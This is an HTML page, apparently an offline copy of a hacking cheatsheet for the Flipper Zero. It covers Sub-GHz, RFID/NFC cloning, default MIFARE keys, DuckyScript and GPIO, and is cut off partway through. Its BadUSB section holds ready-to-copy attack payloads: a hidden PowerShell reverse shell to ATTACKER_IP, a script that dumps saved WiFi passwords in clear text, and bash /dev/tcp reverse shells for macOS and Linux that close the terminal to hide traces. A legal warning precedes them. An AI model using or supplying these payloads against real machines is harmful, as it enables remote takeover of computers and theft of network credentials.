@@ -1,0 +1,675 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Flipper Zero Cheatsheet | Hackers Manifest</title>
+  <style>
+    body { font-family: system-ui, -apple-system, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #1a1a2e; color: #eee; }
+    code { background: #333; padding: 2px 6px; border-radius: 4px; font-family: 'Fira Code', monospace; color: #0ff; }
+    table { width: 100%; border-collapse: collapse; }
+    td { padding: 8px; border-bottom: 1px solid #333; }
+    h1, h2, h3 { color: #0f0; }
+    a { color: #0ff; }
+  </style>
+</head>
+<body>
+  <h1>Flipper Zero Cheatsheet | Hackers Manifest</h1>
+  <p style="color: #888;">Hackers Manifest - Offline Version</p>
+  <hr style="border-color: #333; margin: 20px 0;">
+  
+  <!-- Print Button -->
+  <div class="print:hidden mb-6 flex justify-end gap-3" data-astro-cid-lyloq733="">
+    <button id="print-btn" class="inline-flex items-center gap-2 px-4 py-2 bg-neon-green/10 text-emerald-700 dark:text-neon-green border border-neon-green/30 rounded-lg hover:bg-neon-green/20 transition-colors" data-astro-cid-lyloq733="">
+      <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-lyloq733="">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z" data-astro-cid-lyloq733=""></path>
+      </svg>
+      Print / Save PDF
+    </button>
+    <button id="download-btn" class="inline-flex items-center gap-2 px-4 py-2 bg-neon-cyan/10 text-cyan-700 dark:text-neon-cyan border border-neon-cyan/30 rounded-lg hover:bg-neon-cyan/20 transition-colors" data-astro-cid-lyloq733="">
+      <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-lyloq733="">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" data-astro-cid-lyloq733=""></path>
+      </svg>
+      Download for Offline
+    </button>
+  </div>
+
+  <!-- Print Header (only shows when printing) -->
+  <div class="hidden print:block print:mb-8" data-astro-cid-lyloq733="">
+    <h1 class="text-3xl font-bold text-black" data-astro-cid-lyloq733="" data-emoji-processed="true">Flipper Zero Quick Reference</h1>
+    <p class="text-gray-600 text-sm mt-2" data-astro-cid-lyloq733="">Hackers Manifest - hackersmanifest.com</p>
+    <hr class="mt-4 border-gray-300" data-astro-cid-lyloq733="">
+  </div>
+
+  <!-- Main Content -->
+  <div class="print:text-black print:bg-white" data-astro-cid-lyloq733="">
+    
+  <div class="space-y-8">
+    
+    <!-- Header -->
+    <div class="border-b border-gray-300 dark:border-gray-700 pb-6">
+      <p class="text-gray-600 dark:text-gray-300 text-lg">
+        Comprehensive quick reference for the Flipper Zero multi-tool - covering Sub-GHz, RFID, NFC, IR, BadUSB, WiFi devboard, and GPIO.
+      </p>
+    </div>
+
+    <!-- Legal Warning -->
+    <div class="my-6 p-4 rounded-r-lg backdrop-blur-sm border-l-4 border-yellow-500 bg-yellow-50 dark:bg-yellow-500/10 text-yellow-800 dark:text-yellow-400 shadow-lg">
+  <div class="flex items-start space-x-3">
+    <div class="flex-shrink-0 mt-0.5 animate-pulse-slow motion-reduce:animate-none"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+  </svg></div>
+    <div class="flex-1">
+      <p class="font-bold mb-1 tracking-wide uppercase text-xs opacity-90">Legal Warning</p>
+      <div class="text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
+        
+      <p class="mb-2">The Flipper Zero is a powerful multi-tool. Using it against systems you don't own or have explicit permission to test is <strong>illegal</strong> in most jurisdictions.</p>
+      <ul class="list-disc list-inside space-y-1 text-sm">
+        <li><strong>Sub-GHz:</strong> Transmitting on certain frequencies may violate FCC/radio regulations</li>
+        <li><strong>RFID/NFC:</strong> Cloning access cards without authorization is illegal</li>
+        <li><strong>BadUSB:</strong> Deploying payloads on systems without consent is computer fraud</li>
+        <li><strong>WiFi Attacks:</strong> Deauth attacks and evil portals are illegal without authorization</li>
+        <li><strong>Always</strong> obtain written permission before testing</li>
+      </ul>
+    
+      </div>
+    </div>
+  </div>
+</div>
+
+    <div class="my-6 p-4 rounded-r-lg backdrop-blur-sm border-l-4 border-emerald-500 dark:border-neon-green bg-emerald-50 dark:bg-neon-green/10 text-emerald-800 dark:text-neon-green shadow-lg">
+  <div class="flex items-start space-x-3">
+    <div class="flex-shrink-0 mt-0.5 animate-pulse-slow motion-reduce:animate-none"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path>
+  </svg></div>
+    <div class="flex-1">
+      <p class="font-bold mb-1 tracking-wide uppercase text-xs opacity-90">Custom Firmware &amp; Companion Hardware</p>
+      <div class="text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
+        
+      <strong>Firmware options:</strong> stock <a class="underline" href="https://flipperzero.one/update" target="_blank" rel="noopener">official</a>, <a class="underline" href="https://github.com/Next-Flip/Momentum-Firmware" target="_blank" rel="noopener">Momentum</a> (community successor to Xtreme/Unleashed), <a class="underline" href="https://github.com/DarkFlippers/unleashed-firmware" target="_blank" rel="noopener">Unleashed</a>, <a class="underline" href="https://github.com/RogueMaster/flipperzero-firmware-wPlugins" target="_blank" rel="noopener">RogueMaster</a>. Custom firmware unlocks restricted Sub-GHz regions, Marauder WiFi, and more apps.
+      <strong>Pair with a Proxmark3 RDV4</strong> for serious LF/HF RFID work \u2014 Flipper handles 90% of access cards, but Proxmark covers MIFARE DESFire AES, iCLASS Elite, and Seos.
+      <strong>WiFi devboard</strong> (ESP32-S2 / ESP32-WROOM): Marauder for deauth/probe, Evil Portal for captive portals, Wardriving with GPS.
+      <strong>Video Game Module</strong> (RP2040 + HDMI): GPIO + USB HID expansion for advanced BadUSB.
+    
+      </div>
+    </div>
+  </div>
+</div>
+
+    <!-- Cheatsheet Grid -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+
+      <!-- Sub-GHz Attacks -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-green-100 dark:bg-neon-green/20">
+          <h3 class="text-green-700 dark:text-neon-green font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📡 </span>Sub-GHz Attacks</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Read Signal</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Sub-GHz → Read">Sub-GHz → Read</code></td></tr>
+              <tr><td>Read RAW (unknown protocols)</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Sub-GHz → Read RAW">Sub-GHz → Read RAW</code></td></tr>
+              <tr><td>Save Signal</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: [Left] → Save">[Left] → Save</code></td></tr>
+              <tr><td>Transmit Signal</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Sub-GHz → Saved → Emulate">Sub-GHz → Saved → Emulate</code></td></tr>
+              <tr><td>Add Manually</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Sub-GHz → Add Manually">Sub-GHz → Add Manually</code></td></tr>
+              <tr><td>Frequency Analyzer</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Sub-GHz → Frequency Analyzer">Sub-GHz → Frequency Analyzer</code></td></tr>
+              <tr><td>Delete Signal</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → [Select] → Delete">Saved → [Select] → Delete</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Sub-GHz Protocols -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-emerald-100 dark:bg-emerald-500/20">
+          <h3 class="text-emerald-700 dark:text-emerald-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📻 </span>Sub-GHz Protocols</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>CAME</td><td>12-bit fixed | 433.92 MHz</td></tr>
+              <tr><td>CAME TWEE</td><td>54-bit rolling | 433.92 MHz</td></tr>
+              <tr><td>Nice FLO</td><td>12-bit fixed | 433.92 MHz</td></tr>
+              <tr><td>Nice FLOR-S</td><td>52-bit rolling | 433.92 MHz</td></tr>
+              <tr><td>Princeton</td><td>24-bit fixed | 315/433 MHz</td></tr>
+              <tr><td>Linear</td><td>10-bit fixed | 310 MHz (US)</td></tr>
+              <tr><td>Chamberlain</td><td>9-bit fixed | 315/390 MHz</td></tr>
+              <tr><td>Security+ 2.0</td><td>Encrypted rolling | 310-390 MHz</td></tr>
+              <tr><td>KeeLoq</td><td>66-bit rolling | Various</td></tr>
+              <tr><td>Somfy Telis</td><td>56-bit rolling | 433.42 MHz</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- 125kHz RFID -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-blue-100 dark:bg-blue-500/20">
+          <h3 class="text-blue-700 dark:text-blue-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🏷️ </span>125kHz RFID</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Read Card</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: 125 kHz RFID → Read">125 kHz RFID → Read</code></td></tr>
+              <tr><td>Write Card</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → Write">Saved → Write</code></td></tr>
+              <tr><td>Emulate Card</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → Emulate">Saved → Emulate</code></td></tr>
+              <tr><td>Add Manually</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: 125 kHz RFID → Add Manually">125 kHz RFID → Add Manually</code></td></tr>
+            </tbody>
+          </table>
+          <div class="mt-3 pt-3 border-t border-gray-200 dark:border-gray-700">
+            <p class="text-xs text-gray-500 dark:text-gray-400 font-semibold mb-2">Supported Types:</p>
+            <p class="text-xs text-gray-600 dark:text-gray-400">EM4100, HID Prox, Indala, ioProx, AWID, FDX-B, Paradox, Viking, Jablotron, T5577 (clone target)</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- NFC -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-purple-100 dark:bg-neon-purple/20">
+          <h3 class="text-purple-700 dark:text-neon-purple font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📱 </span>NFC (13.56 MHz)</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Read Card</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: NFC → Read">NFC → Read</code></td></tr>
+              <tr><td>Detect Reader</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: NFC → Detect Reader">NFC → Detect Reader</code></td></tr>
+              <tr><td>Dictionary Attack</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Extra Actions → MF Classic Dict">Extra Actions → MF Classic Dict</code></td></tr>
+              <tr><td>Write Card</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → Write">Saved → Write</code></td></tr>
+              <tr><td>Emulate Card</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → Emulate">Saved → Emulate</code></td></tr>
+            </tbody>
+          </table>
+          <div class="mt-3 pt-3 border-t border-gray-200 dark:border-gray-700">
+            <p class="text-xs text-gray-500 dark:text-gray-400 font-semibold mb-2">Supported Types:</p>
+            <p class="text-xs text-gray-600 dark:text-gray-400">MIFARE Classic 1K/4K, MIFARE Ultralight, NTAG213/215/216, DESFire (limited)</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Magic NFC Cards -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-pink-100 dark:bg-neon-pink/20">
+          <h3 class="text-pink-700 dark:text-neon-pink font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">✨ </span>Magic NFC Cards</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Gen1a (Chinese Magic)</td><td>Backdoor WUPA, detectable</td></tr>
+              <tr><td>Gen2 (CUID)</td><td>Direct block 0 write</td></tr>
+              <tr><td>Gen3 (APDU)</td><td>UID+BCC writable, best compat</td></tr>
+              <tr><td>Gen4 (Ultimate)</td><td>Shadow mode, GDM/GTU</td></tr>
+              <tr><td>FUID</td><td>One-time UID write</td></tr>
+              <tr><td>UFUID</td><td>UID writable until locked</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- MIFARE Keys -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-indigo-100 dark:bg-indigo-500/20">
+          <h3 class="text-indigo-700 dark:text-indigo-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🔑 </span>Common MIFARE Keys</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Factory Default</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: FF FF FF FF FF FF">FF FF FF FF FF FF</code></td></tr>
+              <tr><td>MAD Key</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: A0 A1 A2 A3 A4 A5">A0 A1 A2 A3 A4 A5</code></td></tr>
+              <tr><td>NDEF Key</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: D3 F7 D3 F7 D3 F7">D3 F7 D3 F7 D3 F7</code></td></tr>
+              <tr><td>Transport</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: A0 B0 C0 D0 E0 F0">A0 B0 C0 D0 E0 F0</code></td></tr>
+              <tr><td>All Zeros</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: 00 00 00 00 00 00">00 00 00 00 00 00</code></td></tr>
+              <tr><td>Infineon</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: 4D 3A 99 C3 51 DD">4D 3A 99 C3 51 DD</code></td></tr>
+              <tr><td>Nokia</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: 47 52 4F 4D 49 00">47 52 4F 4D 49 00</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Infrared -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-amber-100 dark:bg-amber-500/20">
+          <h3 class="text-amber-700 dark:text-amber-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📺 </span>Infrared</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Universal Remotes</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: IR → Universal Remotes">IR → Universal Remotes</code></td></tr>
+              <tr><td>Learn Signal</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: IR → Learn New Remote">IR → Learn New Remote</code></td></tr>
+              <tr><td>Save Signal</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: [Left] → Save">[Left] → Save</code></td></tr>
+              <tr><td>Transmit</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: IR → Saved Remotes">IR → Saved Remotes</code></td></tr>
+            </tbody>
+          </table>
+          <div class="mt-3 pt-3 border-t border-gray-200 dark:border-gray-700">
+            <p class="text-xs text-gray-500 dark:text-gray-400 font-semibold mb-2">Built-in Database:</p>
+            <p class="text-xs text-gray-600 dark:text-gray-400">TVs (Samsung, LG, Sony, Vizio), ACs (Carrier, Daikin, Gree), Projectors, Audio</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- DuckyScript Basics -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-orange-100 dark:bg-orange-500/20">
+          <h3 class="text-orange-700 dark:text-orange-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🦆 </span>DuckyScript Commands</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Type text</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: STRING Hello World">STRING Hello World</code></td></tr>
+              <tr><td>Type + Enter</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: STRINGLN text here">STRINGLN text here</code></td></tr>
+              <tr><td>Wait (ms)</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: DELAY 500">DELAY 500</code></td></tr>
+              <tr><td>Default delay</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: DEFAULT_DELAY 100">DEFAULT_DELAY 100</code></td></tr>
+              <tr><td>Enter key</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: ENTER">ENTER</code></td></tr>
+              <tr><td>Win+R</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: GUI r">GUI r</code></td></tr>
+              <tr><td>Ctrl+C</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: CTRL c">CTRL c</code></td></tr>
+              <tr><td>Alt+F4</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: ALT F4">ALT F4</code></td></tr>
+              <tr><td>Tab key</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: TAB">TAB</code></td></tr>
+              <tr><td>Repeat last</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: REPEAT 5">REPEAT 5</code></td></tr>
+              <tr><td>Comment</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: REM Comment here">REM Comment here</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- BadUSB Payload: Windows Shell -->
+      <div class="cheatsheet-card lg:col-span-2">
+        <div class="cheatsheet-card-header bg-red-100 dark:bg-red-500/20">
+          <h3 class="text-red-700 dark:text-red-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">💀 </span>BadUSB: Windows Reverse Shell</h3>
+        </div>
+        <div class="p-4">
+          <pre class="bg-gray-900 text-green-400 p-4 rounded-lg text-xs overflow-x-auto has-copy-button group" style="position: relative;"><code>REM Windows Reverse Shell
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -w hidden
+DELAY 100
+CTRL SHIFT ENTER
+DELAY 800
+ALT y
+DELAY 500
+STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER</code><button class="copy-code-btn absolute top-2 right-2 p-1.5 rounded-md bg-gray-700/50 hover:bg-gray-600/50 text-gray-500 dark:text-gray-300 transition-all opacity-0 group-hover:opacity-100 focus:opacity-100" aria-label="Copy code">
+        <svg class="w-4 h-4 copy-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        <svg class="w-4 h-4 check-icon hidden text-green-700 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+      </button></pre>
+          <p class="text-xs text-gray-500 dark:text-gray-400 mt-2">⚠️ Replace ATTACKER_IP with your listener IP</p>
+        </div>
+      </div>
+
+      <!-- BadUSB Payload: WiFi Creds -->
+      <div class="cheatsheet-card lg:col-span-2">
+        <div class="cheatsheet-card-header bg-red-100 dark:bg-red-500/20">
+          <h3 class="text-red-700 dark:text-red-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">💀 </span>BadUSB: Exfil WiFi Passwords</h3>
+        </div>
+        <div class="p-4">
+          <pre class="bg-gray-900 text-green-400 p-4 rounded-lg text-xs overflow-x-auto has-copy-button group" style="position: relative;"><code>REM Exfiltrate WiFi Passwords to file
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -w hidden
+CTRL SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 300
+STRING (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Out-File $env:TEMP\wifi.txt
+ENTER
+DELAY 2000
+STRING notepad $env:TEMP\wifi.txt
+ENTER</code><button class="copy-code-btn absolute top-2 right-2 p-1.5 rounded-md bg-gray-700/50 hover:bg-gray-600/50 text-gray-500 dark:text-gray-300 transition-all opacity-0 group-hover:opacity-100 focus:opacity-100" aria-label="Copy code">
+        <svg class="w-4 h-4 copy-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        <svg class="w-4 h-4 check-icon hidden text-green-700 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+      </button></pre>
+        </div>
+      </div>
+
+      <!-- BadUSB Payload: macOS/Linux -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-red-100 dark:bg-red-500/20">
+          <h3 class="text-red-700 dark:text-red-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🍎 </span>BadUSB: macOS Shell</h3>
+        </div>
+        <div class="p-4">
+          <pre class="bg-gray-900 text-green-400 p-4 rounded-lg text-xs overflow-x-auto has-copy-button group" style="position: relative;"><code>REM macOS Reverse Shell
+DELAY 1000
+GUI SPACE
+DELAY 200
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1 &amp;
+ENTER
+DELAY 200
+STRING clear &amp;&amp; exit
+ENTER</code><button class="copy-code-btn absolute top-2 right-2 p-1.5 rounded-md bg-gray-700/50 hover:bg-gray-600/50 text-gray-500 dark:text-gray-300 transition-all opacity-0 group-hover:opacity-100 focus:opacity-100" aria-label="Copy code">
+        <svg class="w-4 h-4 copy-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        <svg class="w-4 h-4 check-icon hidden text-green-700 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+      </button></pre>
+        </div>
+      </div>
+
+      <!-- BadUSB Payload: Linux -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-red-100 dark:bg-red-500/20">
+          <h3 class="text-red-700 dark:text-red-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🐧 </span>BadUSB: Linux Shell</h3>
+        </div>
+        <div class="p-4">
+          <pre class="bg-gray-900 text-green-400 p-4 rounded-lg text-xs overflow-x-auto has-copy-button group" style="position: relative;"><code>REM Linux Reverse Shell
+DELAY 1000
+ALT F2
+DELAY 300
+STRING gnome-terminal
+ENTER
+DELAY 800
+STRING bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1 &amp;
+ENTER
+DELAY 200
+STRING exit
+ENTER</code><button class="copy-code-btn absolute top-2 right-2 p-1.5 rounded-md bg-gray-700/50 hover:bg-gray-600/50 text-gray-500 dark:text-gray-300 transition-all opacity-0 group-hover:opacity-100 focus:opacity-100" aria-label="Copy code">
+        <svg class="w-4 h-4 copy-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        <svg class="w-4 h-4 check-icon hidden text-green-700 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+      </button></pre>
+        </div>
+      </div>
+
+      <!-- GPIO & iButton -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-teal-100 dark:bg-teal-500/20">
+          <h3 class="text-teal-700 dark:text-teal-400 font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">🔌 </span>GPIO &amp; iButton</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-sm">
+            <tbody>
+              <tr><td>Read iButton</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: iButton → Read">iButton → Read</code></td></tr>
+              <tr><td>Write iButton</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → Write">Saved → Write</code></td></tr>
+              <tr><td>Emulate iButton</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: Saved → Emulate">Saved → Emulate</code></td></tr>
+              <tr><td>USB-UART Bridge</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: GPIO → USB-UART Bridge">GPIO → USB-UART Bridge</code></td></tr>
+              <tr><td>GPIO Reader</td><td><code data-copy-bound="true" role="button" tabindex="0" title="Click to copy" aria-label="Copy command: GPIO → GPIO Reader">GPIO → GPIO Reader</code></td></tr>
+            </tbody>
+          </table>
+          <div class="mt-3 pt-3 border-t border-gray-200 dark:border-gray-700">
+            <p class="text-xs text-gray-500 dark:text-gray-400">Supported: DS1990A, Cyfral, Metakom, RW1990 (write)</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- GPIO Pinout -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-cyan-100 dark:bg-neon-cyan/20">
+          <h3 class="text-cyan-700 dark:text-neon-cyan font-bold text-lg" data-emoji-processed="true"><span aria-hidden="true">📍 </span>GPIO Pinout</h3>
+        </div>
+        <div class="p-4">
+          <table class="cheatsheet-table w-full text-xs">
+            <tbody>
+              <tr><td>Pin 1</td><td>+5V</td><td>Pin 9</td><td>C1 (USART TX)</td></tr>
+              <tr><td>Pin 2</td><td>A7 (ADC)</td><td>Pin 10</td><td>C0 (USART RX)</td></tr>
+              <tr><td>Pin 5</td><td>B3 (SPI MOSI)</td><td>Pin 11</td><td>B14 (SPI CLK)</td></tr>
+              <tr><td>Pin 6</td><td>B2 (SPI MISO)</td><td>Pin 13</td><td>3.3V</td></tr>
+              <tr><td>Pin 8</td><td>GND</td><td>Pin 18</td><td>1-Wire (iButton)</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- WiFi Devboard -->
+      <div class="cheatsheet-card">
+        <div class="cheatsheet-card-header bg-lime-100 dark:bg-lime-500/20">
